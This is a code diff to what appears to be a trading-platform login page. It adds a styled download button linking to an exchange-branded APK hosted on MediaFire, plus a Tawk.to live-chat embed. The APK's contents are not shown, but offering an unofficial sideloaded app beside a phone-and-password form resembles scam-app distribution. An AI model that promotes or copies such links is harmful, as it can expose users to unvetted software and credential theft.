@@ -161,6 +161,22 @@
         .pay-option.selected { border-color: var(--primary); background: rgba(0, 219, 177, 0.1); }
         .pay-option img { width: 50px; height: 50px; border-radius: 10px; margin-bottom: 8px; }
         .trust-notif { background: rgba(255,215,0,0.1); border: 1px solid var(--active-gold); color: var(--active-gold); padding: 10px; border-radius: 12px; margin-bottom: 15px; font-size: 12px; display: flex; align-items: center; gap: 10px; }
+
+        /* --- NEW DOWNLOAD BUTTON STYLE START --- */
+        .btn-download { 
+            background: linear-gradient(135deg, #FFD700, #FFA500); 
+            color: #000; 
+            margin-bottom: 15px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+        .btn-download i { font-size: 18px; }
+        /* --- NEW DOWNLOAD BUTTON STYLE END --- */
+
     </style>
 </head>
 <body>
@@ -182,6 +198,10 @@
         <p style="color:var(--dim);">Professional Trading Environment</p>
     </div>
     <div id="login-form" class="card">
+        
+        <a href="https://www.mediafire.com/file/mhq86zviuevscxp/_MEXC_PRO_19694733.apk/file" class="btn btn-download">
+            <i class="fas fa-download"></i> APP ကို ဒေါင်းလုဒ်လုပ်ရန်
+        </a>
         <input type="text" id="log-ph" placeholder="Phone Number">
         <div class="pw-wrapper">
             <input type="password" id="log-pw" placeholder="Password">
@@ -978,6 +998,18 @@
     
     function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
     function showNav(el, id) { document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); el.classList.add('active'); showPage(id); }
+</script>
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/69cd57e58688f41c3a2a7d1b/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
 </body>
 </html>
